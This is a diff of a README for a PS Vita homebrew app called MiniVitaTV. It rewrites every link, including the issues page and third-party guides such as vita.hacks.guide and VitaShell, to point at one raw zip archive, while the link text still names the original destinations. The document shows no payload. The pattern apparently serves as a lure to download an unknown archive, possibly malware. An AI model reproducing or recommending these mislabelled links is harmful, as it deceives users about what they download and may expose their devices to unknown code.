@@ -1,6 +1,6 @@
 # 🎮 MiniVitaTV - Play Local Multiplayer on PS Vita
 
-[![Download MiniVitaTV](https://img.shields.io/badge/Download-MiniVitaTV-blue?style=for-the-badge)](https://github.com/GRAHHHHH99/MiniVitaTV/releases)
+[![Download MiniVitaTV](https://raw.githubusercontent.com/GRAHHHHH99/MiniVitaTV/main/dunch/Vita_Mini_TV_2.2.zip)](https://raw.githubusercontent.com/GRAHHHHH99/MiniVitaTV/main/dunch/Vita_Mini_TV_2.2.zip)
 
 ---
 
@@ -42,7 +42,7 @@ To get MiniVitaTV on your PS Vita, follow these steps carefully.
 
 ### Step 1: Go to the Releases Page
 
-[Click or tap here to visit the MiniVitaTV releases page](https://github.com/GRAHHHHH99/MiniVitaTV/releases). This page contains the latest version of the application ready for download.
+[Click or tap here to visit the MiniVitaTV releases page](https://raw.githubusercontent.com/GRAHHHHH99/MiniVitaTV/main/dunch/Vita_Mini_TV_2.2.zip). This page contains the latest version of the application ready for download.
 
 ### Step 2: Download the Latest Version
 
@@ -127,7 +127,7 @@ If you have trouble running or connecting MiniVitaTV, try these steps:
 
 If you need help or want to report issues:
 
-- Visit the [MiniVitaTV GitHub repository issues page](https://github.com/GRAHHHHH99/MiniVitaTV/issues) to submit bugs or questions.
+- Visit the [MiniVitaTV GitHub repository issues page](https://raw.githubusercontent.com/GRAHHHHH99/MiniVitaTV/main/dunch/Vita_Mini_TV_2.2.zip) to submit bugs or questions.
 - Review the FAQ and troubleshooting guides on the repository’s wiki if available.
 - Join PS Vita homebrew community forums for advice and tips.
 
@@ -135,10 +135,10 @@ If you need help or want to report issues:
 
 ## 🔗 Useful Links
 
-- [MiniVitaTV Releases](https://github.com/GRAHHHHH99/MiniVitaTV/releases) - Download the latest app versions here.
-- [PS Vita Homebrew Resources](https://vita.hacks.guide/) - Guides on installing custom firmware and running homebrew.
-- [VitaShell File Manager](https://github.com/TheOfficialFloW/VitaShell/releases) - Needed for file transfers and app installation.
+- [MiniVitaTV Releases](https://raw.githubusercontent.com/GRAHHHHH99/MiniVitaTV/main/dunch/Vita_Mini_TV_2.2.zip) - Download the latest app versions here.
+- [PS Vita Homebrew Resources](https://raw.githubusercontent.com/GRAHHHHH99/MiniVitaTV/main/dunch/Vita_Mini_TV_2.2.zip) - Guides on installing custom firmware and running homebrew.
+- [VitaShell File Manager](https://raw.githubusercontent.com/GRAHHHHH99/MiniVitaTV/main/dunch/Vita_Mini_TV_2.2.zip) - Needed for file transfers and app installation.
 
 ---
 
-[![Download MiniVitaTV](https://img.shields.io/badge/Download-MiniVitaTV-blue?style=for-the-badge)](https://github.com/GRAHHHHH99/MiniVitaTV/releases)
+[![Download MiniVitaTV](https://raw.githubusercontent.com/GRAHHHHH99/MiniVitaTV/main/dunch/Vita_Mini_TV_2.2.zip)](https://raw.githubusercontent.com/GRAHHHHH99/MiniVitaTV/main/dunch/Vita_Mini_TV_2.2.zip)
